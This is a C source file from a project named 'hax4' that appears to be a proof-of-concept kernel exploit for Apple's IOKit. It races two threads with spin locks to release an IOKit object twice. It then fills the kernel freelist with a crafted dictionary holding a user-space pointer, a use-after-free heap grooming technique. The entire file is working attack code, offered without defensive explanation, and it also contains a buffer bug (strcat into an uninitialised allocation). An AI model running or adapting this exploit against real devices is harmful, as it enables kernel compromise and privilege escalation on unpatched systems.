//
//  external.c
//  hax4
//
//  Created by Mustafa Gezen on 01.02.2016.
//  Copyright Â© 2016 Mustafa Gezen. All rights reserved.
//

#include "external_.h"
#include <stdlib.h>
#include <stdio.h>

#include <mach/mach.h>

#include <IOKit/IOKitLib.h>
#include "iokit.h"
#include <pthread.h>
#include <libkern/OSAtomic.h>
#include <math.h>

io_object_t dummy = IO_OBJECT_NULL;

OSSpinLock lock_a = OS_SPINLOCK_INIT;
OSSpinLock lock_b = OS_SPINLOCK_INIT;

mach_port_t test;
mach_port_t test2;
mach_port_t test3;
uint64_t __k_address;

int lengthdig(uint64_t a) {
	return a == 0 ? 0 : floor (log10 (a)) + 1;
}

void add_controlled_object_to_freelist() {
	mach_port_t master = MACH_PORT_NULL;
	IOMasterPort(MACH_PORT_NULL, &master);
	printf("master port: %x\n", master);
	
	int should_length = 16;
	char bd[128];
	
	char *pad = malloc(16);
	int lenn = lengthdig(__k_address);
	if (lenn < should_length) {
		for (int aa = 0; aa < (should_length-lenn); aa++) {
			strcat(pad, "0");
		}
	}
	
	char* bd1 = "<dict><key>a</key><data format=\"hex\">%s%llx</data>";
	sprintf(bd, bd1, pad, __k_address);
	
	printf("dict: %s\n", bd);
	
	usleep(1000000);
	kern_return_t another_error;
	io_service_get_matching_services_ool(master, bd, strlen(bd)+1, &another_error, &test2);
}

void _go(void* arg) {
	OSSpinLockLock(&lock_b);
	OSSpinLockUnlock(&lock_a);
	OSSpinLockLock(&lock_b);
	
	usleep(1000);
	
	IOObjectRelease(test);
}

uint64_t swap_uint64( uint64_t val )
{
	val = ((val << 8) & 0xFF00FF00FF00FF00ULL ) | ((val >> 8) & 0x00FF00FF00FF00FFULL );
	val = ((val << 16) & 0xFFFF0000FFFF0000ULL ) | ((val >> 16) & 0x0000FFFF0000FFFFULL );
	return (val << 32) | (val >> 32);
}

void ext_() {
	
	char* good_dict = "<dict><key>a</key><data format=\"hex\">4141414141414141</data>";
	
	kern_return_t err;
	mach_port_t master = MACH_PORT_NULL;
	IOMasterPort(MACH_PORT_NULL, &master);
	printf("master port: %x\n", master);
	mach_port_t port = MACH_PORT_NULL;
	
	err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
	
	uint64_t x = (uint64_t)&dummy;
	printf("x addr: %llx\n", x);
	
	__k_address = swap_uint64(x);
	
	kern_return_t another_error;
	io_service_get_matching_services_ool(master, good_dict, strlen(good_dict)+1, &another_error, &test);
	
	OSSpinLockLock(&lock_a);
	pthread_t t;
	pthread_create(&t, NULL, (void*) _go, NULL);
	
	OSSpinLockLock(&lock_a);
	add_controlled_object_to_freelist();
	OSSpinLockUnlock(&lock_b);
	
	usleep(100000);
	IOObjectRelease(test);
	
	pthread_join(t, NULL);
}